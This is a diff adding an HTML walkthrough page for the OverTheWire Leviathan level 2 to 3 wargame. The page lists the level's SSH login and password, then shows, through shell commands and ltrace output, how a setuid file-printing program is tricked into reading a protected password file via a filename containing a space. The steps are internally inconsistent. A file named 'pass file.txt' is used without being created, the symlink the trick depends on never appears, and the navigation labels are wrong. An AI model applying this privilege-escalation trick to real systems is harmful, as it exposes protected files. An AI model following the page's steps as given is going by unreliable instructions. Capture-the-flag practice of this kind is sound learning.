@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OTW Leviathan 2 &#8594; 3 @ Shukularuni</title>
+    <link rel="stylesheet" href="/style.css">
+    <link rel="icon" type="image/x-icon" href="/icon.png">
+</head>
+<body>
+    <header>
+        <h1>OverTheWire Leviathan Guide</h1>
+        <p>here's how to solve the leviathan level 2 &#8594; 3</p>
+    </header>
+    <main>
+        <section>
+            <a href="./">Back to the Leviathan Guides</a>
+            <p>Previous Level Guide: <a href="2.html">Bandit Level 1 &#8594; 2</a></p>
+            <hr>
+            <h2>Access</h2>
+            <p>SSH: <code>ssh leviathan2@leviathan.labs.overthewire.org -p 2223</code></p>
+            <p>Password: <code>9QdXFgQMMo</code></p>
+            <h2>Info</h2>
+            <pre>Description: There is no information for this level, intentionally.</pre>
+            <h2>Theory</h2>
+            <p>Not much to do with the details from the task, so just skipping to doing it.</p>
+            <h2>Solution</h2>
+            <p>Because the task doesn't tell us anything about the level, first we will use ls -la to see all files regardless they are hidden and some details of the files/folders:</p>
+            <pre>~$ ls -la
+total 36
+drwxr-xr-x  2 root       root        4096 Sep 19 07:07 .
+drwxr-xr-x 83 root       root        4096 Sep 19 07:09 ..
+-rw-r--r--  1 root       root         220 Mar 31  2024 .bash_logout
+-rw-r--r--  1 root       root        3771 Mar 31  2024 .bashrc
+-r-sr-x---  1 leviathan3 leviathan2 15068 Sep 19 07:07 printfile
+-rw-r--r--  1 root       root         807 Mar 31  2024 .profile</pre>
+            <p>Now there's an executable file called printfile which probably just uses cat to print those files, if we don't put a file it tells us the usage:</p>
+            <pre>~$ ./printfile
+*** File Printer ***
+Usage: /home/leviathan2/printfile filename</pre>
+            <p>If we try to do this with the password file it will know:</p>
+            <pre>./printfile /etc/leviathan_pass/leviathan3
+You cant have that file...</pre>
+            <p>So let's create a temporary directory to create a file and put it through this program to see how it works with ltrace, but unlike Bandit, in this one we can only make our own directory, it cannot be mktemp for some weird reason, it just doesn't work with this program. Anyway, let's try with a file of our own:</p>
+            <pre>~$ mkdir /tmp/shukularuni
+
+~$ cd /tmp/shukularuni
+
+/tmp/shukularuni$ touch testign.txt
+
+/tmp/shukularuni$ ls
+testign.txt
+
+/tmp/shukularuni$ ltrace ~/printfile testign.txt
+__libc_start_main(0x80490ed, 2, 0xffffd434, 0 <unfinished ...>
+access("testign.txt", 4)                                                  = 0
+snprintf("/bin/cat testign.txt", 511, "/bin/cat %s", "testign.txt")       = 20
+geteuid()                                                                 = 12002
+geteuid()                                                                 = 12002
+setreuid(12002, 12002)                                                    = 0
+system("/bin/cat testign.txt" <no return ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                                                    = 0
++++ exited (status 0) +++</pre>
+            <p>So turns out the program uses cat to print the files and access for the files, a vulnerability! This is because if you enter a file with spaces in its filename and put it in it's form where it's surrounded by double quotation marks like "spaces filename.txt" it will think "spaces" and "filename.txt" are two different files, and that's important because that means it won't check for the password file from before, we can verify this with a new file and ltrace again:</p>
+            <pre>/tmp/shukularuni$ touch spaces\ filename.txt
+
+/tmp/shukularuni$ ls
+spaces filename.txt  testign.txt
+
+/tmp/shukularuni$ ltrace ~/printfile "pass file.txt"
+__libc_start_main(0x80490ed, 2, 0xffffd434, 0 <unfinished ...>
+access("pass file.txt", 4)                                                = 0
+snprintf("/bin/cat pass file.txt", 511, "/bin/cat %s", "pass file.txt")   = 22
+geteuid()                                                                 = 12002
+geteuid()                                                                 = 12002
+setreuid(12002, 12002)                                                    = 0
+system("/bin/cat pass file.txt"/bin/cat: pass: No such file or directory
+/bin/cat: file.txt: No such file or directory
+ <no return ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                                                    = 256
++++ exited (status 0) +++</pre>
+            <p>Now we just need the first one, aka "spaces", to link to the password file:</p>
+            <pre>/tmp/shukularuni$ ~/printfile "pass file.txt"
+M4nEAjAXgk
+/bin/cat: file.txt: No such file or directory</pre>
+            <p>And that's our password! Now you can exit and go to the next level.</p>
+            <a target="_blank" href="https://overthewire.org/wargames/leviathan/leviathan1.html">https://overthewire.org/wargames/leviathan/leviathan1.html</a>
+            <hr>
+            Next Level Guide: <a href="3.html">Leviathan Level 2 &#8594; Level 3</a>
+        </section>
+        <section class="link-list">
+            <h2>Explore My Website</h2>
+            <ul>
+                <li><a href="/">Home</a></li>
+                <li><a href="/search.html">Search</a></li>
+                <li><a href="/articles.html">Articles</a></li>
+                <li><a href="/guides.html">Guides</a></li>
+            </ul>
+            <br><br><br>
+        </section>
+    </main>
+    <footer>
+        <p class="cute">Made with ❤️ by Shukularuni</p>
+    </footer>
+</body>
+</html>
